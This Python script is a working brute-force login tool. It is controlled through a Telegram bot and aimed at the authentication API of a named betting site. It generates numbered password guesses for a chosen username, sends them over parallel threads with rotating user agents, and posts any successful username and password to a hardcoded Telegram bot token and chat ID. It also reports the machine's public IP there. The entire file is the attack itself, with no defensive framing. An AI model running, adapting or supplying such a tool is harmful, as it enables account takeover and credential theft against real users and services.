from keep_alive import keep_alive
keep_alive()

import os
import requests
import re
import threading
import concurrent.futures
import time
import random

# --- Telegram Credentials ---
TELEGRAM_BOT_TOKEN = '8154110377:AAG1Hj5gad--zrhtY28VKo9ZFYWxw17UK-M'
TELEGRAM_USER_ID = '1180370042'

# Send Public IP when script starts
try:
    ip = requests.get("https://api64.ipify.org").text
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {"chat_id": TELEGRAM_USER_ID, "text": f"🔍 Script running from IP: {ip}"}
    requests.post(url, data=data)
except Exception:
    pass

# --- API config ---
API_URL = "https://api.dcric99.com/api/auth"
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5)",
    "Mozilla/5.0 (iPad; CPU OS 13_6 like Mac OS X)",
]

stop_worker = threading.Event()
pause_worker = threading.Event()
current_worker = None
current_index = 0
total_passwords = 0
last_password_tried = ""

def send_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {"chat_id": TELEGRAM_USER_ID, "text": message}
        requests.post(url, data=data, timeout=5)
    except Exception:
        pass

def parse_command(text):
    m = re.search(r'try\s+(\w+)\s+with\s+([^\s]+)\s+from\s+(\d+)\s+to\s+(\d+)', text, re.I)
    if not m:
        return None, None
    username = m.group(1)
    pattern = m.group(2)
    start = int(m.group(3))
    end = int(m.group(4))
    if '{num}' in pattern:
        passwords = [pattern.replace('{num}', str(i)) for i in range(start, end+1)]
    else:
        passwords = [f"{pattern}{i}" for i in range(start, end+1)]
    return username, passwords

def try_login_batch(username, passwords):
    global current_index, last_password_tried
    found = threading.Event()
    finished_alert_sent = threading.Event()
    current_index = 0

    def login_attempt(pwd):
        global current_index, last_password_tried
        while pause_worker.is_set() and not stop_worker.is_set():
            time.sleep(0.5)
        if stop_worker.is_set() or found.is_set():
            return

        current_index += 1
        last_password_tried = pwd

        HEADERS = {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "User-Agent": random.choice(USER_AGENTS),
            "Origin": "https://reddybook.club",
            "Referer": "https://reddybook.club/"
        }

        payload = {
            "username": username,
            "password": pwd,
            "domain": "reddybook.club"
        }
        attempts = 0
        while attempts < 3 and not stop_worker.is_set():
            try:
                res = requests.post(API_URL, json=payload, headers=HEADERS, timeout=7)
                try:
                    data = res.json()
                except Exception:
                    time.sleep(random.uniform(0.5, 1.0))
                    attempts += 1
                    continue
                if (
                    data.get("status") is True or
                    data.get("success") is True or
                    "token" in data or
                    "user" in data or
                    data.get("message", "").lower() in ["success", "login successful", "welcome"]
                ):
                    msg = f"✅ LOGIN SUCCESS ✅\nUsername: {username}\nPassword: {pwd}"
                    print(msg)
                    send_telegram(msg)
                    found.set()
                    finished_alert_sent.set()
                    return
                break
            except Exception as e:
                print(f"⚠️ Error for {pwd}: {e}")
                time.sleep(random.uniform(0.5, 1.0))
                attempts += 1

    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        futures = [executor.submit(login_attempt, pwd) for pwd in passwords]
        for future in concurrent.futures.as_completed(futures):
            if stop_worker.is_set() or found.is_set():
                break

    if (not found.is_set()) and (not stop_worker.is_set()) and (not finished_alert_sent.is_set()):
        send_telegram("❗ Password trying finished. No matching password found.")
        print("❗ Password batch completed. No password matched.")
        finished_alert_sent.set()

def worker_thread(username, passwords):
    stop_worker.clear()
    pause_worker.clear()
    try_login_batch(username, passwords)

def check_telegram_command():
    global current_worker, total_passwords, current_index
    last_update = 0
    while True:
        try:
            url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates?offset={last_update + 1}&timeout=25'
            res = requests.get(url, timeout=30)
            data = res.json()
            updates = data.get("result", [])
            max_update_id = last_update
            for update in updates:
                update_id = update["update_id"]
                if update_id > max_update_id:
                    max_update_id = update_id
                message = update.get("message", {}).get("text", "")
                if not message:
                    continue
                cmd = message.strip().lower()
                if cmd == "stop":
                    send_telegram("🛑 Current batch stopped. Script is still running.")
                    stop_worker.set()
                elif cmd == "pause":
                    pause_worker.set()
                    send_telegram("⏸️ Script paused.")
                elif cmd == "resume":
                    pause_worker.clear()
                    send_telegram("▶️ Script resumed.")
                elif cmd == "restart":
                    stop_worker.set()
                    pause_worker.clear()
                    send_telegram("✅ Restart complete. Ready for next command.")
                elif cmd == "status":
                    percent = (current_index / total_passwords) * 100 if total_passwords else 0
                    msg = f"🔄 Password try status:\nTried: {current_index} of {total_passwords} ({percent:.1f}%)\nLast: {last_password_tried}"
                    send_telegram(msg)
                else:
                    username, password_list = parse_command(message)
                    if username and password_list:
                        if current_worker and current_worker.is_alive():
                            send_telegram("⚠️ Previous batch still running. Use 'stop' or 'restart' first.")
                        else:
                            total_passwords = len(password_list)
                            current_index = 0
                            send_telegram(f"🔍 Trying {total_passwords} passwords for `{username}` ...")
                            t = threading.Thread(target=worker_thread, args=(username, password_list))
                            current_worker = t
                            t.start()
            last_update = max_update_id
        except Exception as e:
            send_telegram(f"❌ Script crashed!")
            send_telegram(f"Last tried: {last_password_tried}")
        time.sleep(1)

if __name__ == "__main__":
    print("🤖 Script running. Waiting for Telegram commands.")
    check_telegram_command()
